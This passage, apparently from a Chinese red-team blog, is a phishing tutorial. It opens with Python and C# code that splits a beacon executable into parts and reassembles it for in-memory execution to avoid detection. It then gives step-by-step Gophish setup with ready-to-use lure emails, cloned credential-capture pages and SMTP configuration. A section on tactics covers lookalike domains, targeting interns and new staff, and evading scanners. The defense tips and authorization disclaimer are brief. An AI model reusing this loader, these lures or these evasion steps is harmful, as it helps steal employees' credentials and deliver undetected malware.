</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 beacon.exe 分割成多个部分</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;beacon.exe&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">part_size = <span class="built_in">len</span>(data) // <span class="number">3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload_part1.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data[:part_size])</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload_part2.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data[part_size:part_size*<span class="number">2</span>])</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload_part3.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data[part_size*<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>Loader 组合并执行</strong>：</li>
</ol>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Loader</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 读取分割的 Payload</span></span><br><span class="line">        <span class="built_in">byte</span>[] part1 = File.ReadAllBytes(<span class="string">&quot;payload_part1.dat&quot;</span>);</span><br><span class="line">        <span class="built_in">byte</span>[] part2 = File.ReadAllBytes(<span class="string">&quot;payload_part2.dat&quot;</span>);</span><br><span class="line">        <span class="built_in">byte</span>[] part3 = File.ReadAllBytes(<span class="string">&quot;payload_part3.dat&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 组合 Payload</span></span><br><span class="line">        <span class="built_in">byte</span>[] payload = <span class="keyword">new</span> <span class="built_in">byte</span>[part1.Length + part2.Length + part3.Length];</span><br><span class="line">        Buffer.BlockCopy(part1, <span class="number">0</span>, payload, <span class="number">0</span>, part1.Length);</span><br><span class="line">        Buffer.BlockCopy(part2, <span class="number">0</span>, payload, part1.Length, part2.Length);</span><br><span class="line">        Buffer.BlockCopy(part3, <span class="number">0</span>, payload, part1.Length + part2.Length, part3.Length);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 内存加载执行</span></span><br><span class="line">        Assembly assembly = Assembly.Load(payload);</span><br><span class="line">        assembly.EntryPoint.Invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Gophish-钓鱼实战"><a href="#Gophish-钓鱼实战" class="headerlink" title="Gophish 钓鱼实战"></a>Gophish 钓鱼实战</h1><h2 id="配置用户组"><a href="#配置用户组" class="headerlink" title="配置用户组"></a>配置用户组</h2><p><strong>第一步：创建用户组</strong></p>
<p>在 Gophish 管理后台，点击 <code>Users &amp; Groups</code> -&gt; <code>New Group</code></p>
<p><img src="/2026/02/09/fish/4.webp" loading='lazy'></p>
<p><strong>第二步：添加目标用户</strong></p>
<p><strong>手动添加</strong>：</p>
<ul>
<li>First Name：张三</li>
<li>Last Name：员工</li>
<li>Email：<a href="mailto:&#122;&#x68;&#x61;&#110;&#103;&#115;&#x61;&#110;&#x40;&#x74;&#x61;&#114;&#x67;&#x65;&#116;&#x2d;&#x63;&#111;&#109;&#112;&#97;&#x6e;&#x79;&#46;&#99;&#x6f;&#x6d;">zhangsan@target-company.com</a></li>
<li>Position：技术部</li>
</ul>
<p><strong>批量导入</strong>（CSV 格式）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">First Name,Last Name,Email,Position</span><br><span class="line">张三,员工,zhangsan@target-company.com,技术部</span><br><span class="line">李四,员工,lisi@target-company.com,财务部</span><br><span class="line">王五,员工,wangwu@target-company.com,人力资源部</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="配置邮件模板"><a href="#配置邮件模板" class="headerlink" title="配置邮件模板"></a>配置邮件模板</h2><p><strong>第一步：创建邮件模板</strong></p>
<p>点击 <code>Email Templates</code> -&gt; <code>New Template</code></p>
<p><img src="/2026/02/09/fish/5.webp" loading='lazy'></p>
<p><strong>第二步：编写邮件内容</strong></p>
<p><strong>示例 1：IT 部门通知</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">主题：【重要】公司邮箱系统升级通知</span><br><span class="line"></span><br><span class="line">尊敬的员工：</span><br><span class="line"></span><br><span class="line">为了提升邮箱系统的安全性和稳定性，IT 部门将于本周末进行系统升级。</span><br><span class="line"></span><br><span class="line">请您在升级前完成邮箱验证，以确保升级后能够正常使用邮箱服务。</span><br><span class="line"></span><br><span class="line">验证地址：&#123;&#123;.URL&#125;&#125;</span><br><span class="line"></span><br><span class="line">如有疑问，请联系 IT 部门：it-support@company.com</span><br><span class="line"></span><br><span class="line">此致</span><br><span class="line">IT 部门</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：HR 部门通知</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">主题：2024 年度员工福利调查问卷</span><br><span class="line"></span><br><span class="line">亲爱的同事：</span><br><span class="line"></span><br><span class="line">为了更好地了解员工需求，人力资源部发起了 2024 年度员工福利调查。</span><br><span class="line"></span><br><span class="line">请您抽出 5 分钟时间填写问卷：&#123;&#123;.URL&#125;&#125;</span><br><span class="line"></span><br><span class="line">您的反馈对我们非常重要！</span><br><span class="line"></span><br><span class="line">人力资源部</span><br></pre></td></tr></table></figure>

<p><strong>第三步：插入超链接</strong></p>
<p>在邮件编辑器中，选中要作为超链接的文本，按下 <code>Ctrl + K</code>，输入 <code>&#123;&#123;.URL&#125;&#125;</code>。</p>
<p><img src="/2026/02/09/fish/6.webp" loading='lazy'></p>
<p><strong>Gophish 变量</strong>：</p>
<ul>
<li><code>&#123;&#123;.FirstName&#125;&#125;</code>：目标用户的名字</li>
<li><code>&#123;&#123;.LastName&#125;&#125;</code>：目标用户的姓氏</li>
<li><code>&#123;&#123;.Email&#125;&#125;</code>：目标用户的邮箱</li>
<li><code>&#123;&#123;.Position&#125;&#125;</code>：目标用户的职位</li>
<li><code>&#123;&#123;.URL&#125;&#125;</code>：钓鱼页面的 URL</li>
<li><code>&#123;&#123;.Tracker&#125;&#125;</code>：邮件打开跟踪像素</li>
</ul>
<hr>
<h2 id="配置钓鱼页面"><a href="#配置钓鱼页面" class="headerlink" title="配置钓鱼页面"></a>配置钓鱼页面</h2><p><strong>第一步：创建 Landing Page</strong></p>
<p>点击 <code>Landing Pages</code> -&gt; <code>New Page</code></p>
<p><strong>第二步：导入钓鱼页面</strong></p>
<p><strong>方法 1：使用 SingleFile 保存的 HTML</strong></p>
<ol>
<li>使用 SingleFile 插件保存目标登录页面</li>
<li>将 HTML 内容粘贴到 Gophish 的 <code>HTML</code> 编辑器</li>
</ol>
<p><img src="/2026/02/09/fish/9.webp" loading='lazy'></p>
<p><strong>方法 2：直接导入 URL</strong></p>
<ol>
<li>输入目标登录页面的 URL</li>
<li>点击 <code>Import Site</code></li>
<li>Gophish 会自动抓取页面内容</li>
</ol>
<p><strong>第三步：配置凭证捕获</strong></p>
<p>勾选 <code>Capture Submitted Data</code> 和 <code>Capture Passwords</code>，Gophish 会自动记录用户提交的凭证。</p>
<hr>
<h2 id="配置邮件发送服务器"><a href="#配置邮件发送服务器" class="headerlink" title="配置邮件发送服务器"></a>配置邮件发送服务器</h2><p><strong>第一步：创建 Sending Profile</strong></p>
<p>点击 <code>Sending Profiles</code> -&gt; <code>New Profile</code></p>
<p><img src="/2026/02/09/fish/10.webp" loading='lazy'></p>
<p><strong>第二步：配置 SMTP 服务器</strong></p>
<p><strong>使用 163 邮箱示例</strong>：</p>
<ul>
<li>Name：163 邮箱</li>
<li>From：<a href="mailto:&#121;&#x6f;&#x75;&#x72;&#x2d;&#101;&#109;&#x61;&#105;&#108;&#64;&#49;&#x36;&#x33;&#46;&#99;&#x6f;&#109;">your-email@163.com</a></li>
<li>Host：smtp.163.com:25</li>
<li>Username：<a href="mailto:&#121;&#111;&#x75;&#x72;&#45;&#101;&#109;&#x61;&#105;&#108;&#64;&#49;&#54;&#x33;&#46;&#x63;&#111;&#109;">your-email@163.com</a></li>
<li>Password：邮箱授权码（不是登录密码）</li>
</ul>
<p><strong>获取 163 邮箱授权码</strong>：</p>
<ol>
<li>登录 163 邮箱</li>
<li>设置 -&gt; POP3&#x2F;SMTP&#x2F;IMAP</li>
<li>开启 SMTP 服务</li>
<li>生成授权码</li>
</ol>
<p><strong>第三步：测试邮件发送</strong></p>
<p>点击 <code>Send Test Email</code>，输入测试邮箱地址，验证配置是否正确。</p>
<hr>
<h2 id="发起钓鱼活动"><a href="#发起钓鱼活动" class="headerlink" title="发起钓鱼活动"></a>发起钓鱼活动</h2><p><strong>第一步：创建 Campaign</strong></p>
<p>点击 <code>Campaigns</code> -&gt; <code>New Campaign</code></p>
<p><strong>第二步：配置活动参数</strong></p>
<ul>
<li>Name：2024 年度邮箱升级通知</li>
<li>Email Template：选择之前创建的邮件模板</li>
<li>Landing Page：选择钓鱼页面</li>
<li>URL：钓鱼页面的访问地址（如 <code>http://your-server.com</code>）</li>
<li>Sending Profile：选择邮件发送配置</li>
<li>Groups：选择目标用户组</li>
</ul>
<p><strong>第三步：设置发送时间</strong></p>
<ul>
<li>Launch Date：立即发送或定时发送</li>
<li>Send Emails By：分批发送的时间间隔（避免触发垃圾邮件过滤）</li>
</ul>
<p><strong>第四步：启动活动</strong></p>
<p>点击 <code>Launch Campaign</code>，Gophish 开始发送钓鱼邮件。</p>
<hr>
<h2 id="监控钓鱼效果"><a href="#监控钓鱼效果" class="headerlink" title="监控钓鱼效果"></a>监控钓鱼效果</h2><p><strong>实时统计</strong>：</p>
<ul>
<li><strong>Sent</strong>：已发送的邮件数量</li>
<li><strong>Opened</strong>：打开邮件的用户数量</li>
<li><strong>Clicked</strong>：点击链接的用户数量</li>
<li><strong>Submitted Data</strong>：提交凭证的用户数量</li>
</ul>
<p><strong>详细数据</strong>：</p>
<p>点击 Campaign 名称，查看每个用户的详细行为：</p>
<ul>
<li>邮件发送时间</li>
<li>邮件打开时间</li>
<li>链接点击时间</li>
<li>提交的凭证（用户名、密码）</li>
<li>IP 地址和 User-Agent</li>
</ul>
<hr>
<h1 id="钓鱼攻击最佳实践"><a href="#钓鱼攻击最佳实践" class="headerlink" title="钓鱼攻击最佳实践"></a>钓鱼攻击最佳实践</h1><h2 id="邮件内容设计"><a href="#邮件内容设计" class="headerlink" title="邮件内容设计"></a>邮件内容设计</h2><p><strong>1. 制造紧迫感</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">主题：【紧急】您的账户将在 24 小时内被锁定</span><br><span class="line"></span><br><span class="line">您的邮箱账户存在异常登录行为，为了保护您的账户安全，系统将在 24 小时内锁定您的账户。</span><br><span class="line"></span><br><span class="line">请立即验证您的身份：[验证链接]</span><br></pre></td></tr></table></figure>

<p><strong>2. 利用权威性</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">主题：来自 CEO 的重要通知</span><br><span class="line"></span><br><span class="line">各位同事：</span><br><span class="line"></span><br><span class="line">根据董事会决议，公司将调整薪酬结构。请在本周五前完成薪酬调查问卷。</span><br><span class="line"></span><br><span class="line">[问卷链接]</span><br><span class="line"></span><br><span class="line">CEO 办公室</span><br></pre></td></tr></table></figure>

<p><strong>3. 提供价值</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">主题：2024 年度培训计划 - 免费技术课程</span><br><span class="line"></span><br><span class="line">亲爱的同事：</span><br><span class="line"></span><br><span class="line">公司为技术部门员工提供免费的云计算认证培训。名额有限，先到先得。</span><br><span class="line"></span><br><span class="line">[报名链接]</span><br><span class="line"></span><br><span class="line">人力资源部</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="钓鱼页面优化"><a href="#钓鱼页面优化" class="headerlink" title="钓鱼页面优化"></a>钓鱼页面优化</h2><p><strong>1. 完全克隆目标页面</strong>：</p>
<ul>
<li>使用 SingleFile 保存完整的 HTML、CSS、JavaScript</li>
<li>确保页面样式和功能与真实页面一致</li>
</ul>
<p><strong>2. 使用 HTTPS</strong>：</p>
<ul>
<li>申请免费的 SSL 证书（Let’s Encrypt）</li>
<li>避免浏览器显示”不安全”警告</li>
</ul>
<p><strong>3. 使用相似域名</strong>：</p>
<ul>
<li><code>company-login.com</code>（真实域名：<code>company.com</code>）</li>
<li><code>companyy.com</code>（多一个字母）</li>
<li><code>company-portal.com</code>（添加常见后缀）</li>
</ul>
<p><strong>4. 添加诱饵文档</strong>：</p>
<ul>
<li>用户提交凭证后，自动下载一个真实的文档</li>
<li>降低用户的怀疑</li>
</ul>
<hr>
<h2 id="目标选择策略"><a href="#目标选择策略" class="headerlink" title="目标选择策略"></a>目标选择策略</h2><p><strong>1. 高价值目标</strong>：</p>
<ul>
<li>IT 管理员：拥有高权限账户</li>
<li>财务人员：可以访问财务系统</li>
<li>HR 人员：可以访问员工信息</li>
</ul>
<p><strong>2. 易攻击目标</strong>：</p>
<ul>
<li>新员工：对公司流程不熟悉</li>
<li>实习生：安全意识较弱</li>
<li>外包人员：不了解公司安全政策</li>
</ul>
<p><strong>3. 信息收集</strong>：</p>
<ul>
<li>LinkedIn：获取员工姓名、职位、邮箱格式</li>
<li>公司官网：获取组织架构、联系方式</li>
<li>社交媒体：了解员工兴趣爱好</li>
</ul>
<hr>
<h2 id="规避检测技术"><a href="#规避检测技术" class="headerlink" title="规避检测技术"></a>规避检测技术</h2><p><strong>1. 邮件发送</strong>：</p>
<ul>
<li>使用真实的邮箱服务（Gmail、Outlook）</li>
<li>配置 SPF、DKIM、DMARC 记录</li>
<li>分批发送，避免触发垃圾邮件过滤</li>
</ul>
<p><strong>2. 钓鱼页面</strong>：</p>
<ul>
<li>使用 CDN 隐藏真实服务器 IP</li>
<li>检测访问者的 User-Agent，拒绝爬虫访问</li>
<li>限制访问次数，防止被安全厂商分析</li>
</ul>
<p><strong>3. 木马投递</strong>：</p>
<ul>
<li>使用免杀技术（加壳、混淆、内存加载）</li>
<li>分离式木马，降低单个文件的检测率</li>
<li>使用合法的代码签名证书</li>
</ul>
<hr>
<h1 id="防御钓鱼攻击"><a href="#防御钓鱼攻击" class="headerlink" title="防御钓鱼攻击"></a>防御钓鱼攻击</h1><h2 id="技术防御"><a href="#技术防御" class="headerlink" title="技术防御"></a>技术防御</h2><p><strong>1. 邮件安全</strong>：</p>
<ul>
<li>部署邮件网关，过滤钓鱼邮件</li>
<li>启用 SPF、DKIM、DMARC 验证</li>
<li>标记外部邮件，提醒用户注意</li>
</ul>
<p><strong>2. 端点防护</strong>：</p>
<ul>
<li>部署 EDR 解决方案</li>
<li>启用应用程序白名单</li>
<li>禁用宏和脚本自动执行</li>
</ul>
<p><strong>3. 网络防护</strong>：</p>
<ul>
<li>部署 DNS 过滤，阻止访问钓鱼域名</li>
<li>使用 Web 代理，检测钓鱼页面</li>
<li>监控异常的外部连接</li>
</ul>
<hr>
<h2 id="人员培训"><a href="#人员培训" class="headerlink" title="人员培训"></a>人员培训</h2><p><strong>1. 安全意识培训</strong>：</p>
<ul>
<li>定期进行钓鱼攻击模拟演练</li>
<li>教育员工识别钓鱼邮件的特征</li>
<li>建立安全事件报告机制</li>
</ul>
<p><strong>2. 识别钓鱼邮件的技巧</strong>：</p>
<ul>
<li>检查发件人邮箱地址</li>
<li>警惕紧急或威胁性的语言</li>
<li>不点击邮件中的可疑链接</li>
<li>不下载未知的附件</li>
<li>通过其他渠道验证邮件真实性</li>
</ul>
<p><strong>3. 建立报告机制</strong>：</p>
<ul>
<li>提供简单的钓鱼邮件报告按钮</li>
<li>奖励报告钓鱼邮件的员工</li>
<li>及时处理和分析报告的邮件</li>
</ul>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>钓鱼攻击是红队行动中获取初始访问权限的重要手段，成功的钓鱼攻击依赖于：</p>
<ol>
<li><p><strong>精心设计的邮件内容</strong>：</p>
<ul>
<li>制造紧迫感和权威性</li>
<li>符合目标公司的沟通风格</li>
<li>提供明确的行动指引</li>
</ul>
</li>
<li><p><strong>逼真的钓鱼页面</strong>：</p>
<ul>
<li>完全克隆目标登录页面</li>
<li>使用 HTTPS 和相似域名</li>
<li>添加诱饵文档降低怀疑</li>
</ul>
</li>
<li><p><strong>有效的木马伪装</strong>：</p>
<ul>
<li>文件名和图标伪装</li>
<li>执行后显示错误提示</li>
<li>使用分离式木马降低检测率</li>
</ul>
</li>
<li><p><strong>合理的目标选择</strong>：</p>
<ul>
<li>优先攻击高价值和易攻击目标</li>
<li>充分的信息收集</li>
<li>个性化的钓鱼内容</li>
</ul>
</li>
</ol>
<p>记住：钓鱼攻击技术需要在授权的渗透测试环境中使用，未经授权的钓鱼攻击属于违法行为。在实际的红队行动中，必须获得明确的书面授权，并严格遵守法律法规和道德规范。</p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/">钓鱼攻击</a><a class="post-meta__tags" href="/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2026/02/10/sd/" title="内网隧道与代理技术"><img class="cover" src="/img/covers/shinchan-cover-08.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">内网隧道与代理技术</div></div></div></a><a class="pagination-related  no-desc" href="/2026/02/08/wc/" title="Windows/Linux 权限维持技术"><img class="cover" src="/img/covers/shinchan-cover-05.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Windows/Linux 权限维持技术</div></div></div></a></nav></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-links"><a class="footer-link" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer">友情链接：映雪安全</a><a class="footer-link" href="https://qm.qq.com/q/QNgesnj1aU" target="_blank" rel="noopener noreferrer">QQ群：点击加群</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script>
(() => {
  const imageSelectors = "#article-container img, #recent-posts img, .article-sort-item-img img";
  const addFallback = (img) => {
    if (!img || img.dataset.ipFallbackBound === "1") return;
    img.dataset.ipFallbackBound = "1";
    img.addEventListener("error", () => {
      const original = img.getAttribute("src") || "";
      if (!original) return;
      if (img.dataset.ipFallbackDone === "1") return;
      img.dataset.ipFallbackDone = "1";
      if (/\.webp(\?.*)?$/i.test(original)) {
        img.onerror = () => {
          img.onerror = null;
          img.src = original.replace(/\.webp(\?.*)?$/i, ".jpg$1");
          img.onerror = () => {
            img.onerror = null;
            img.src = "/img/404.jpg";
          };
        };
        img.src = original.replace(/\.webp(\?.*)?$/i, ".png$1");
        return;
      }
      img.onerror = null;
      img.src = "/img/404.jpg";
    });
  };
  const bindAll = () => document.querySelectorAll(imageSelectors).forEach(addFallback);
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", bindAll);
  } else {
    bindAll();
  }
  document.addEventListener("pjax:complete", bindAll);
})();
</script>
</div></body></html>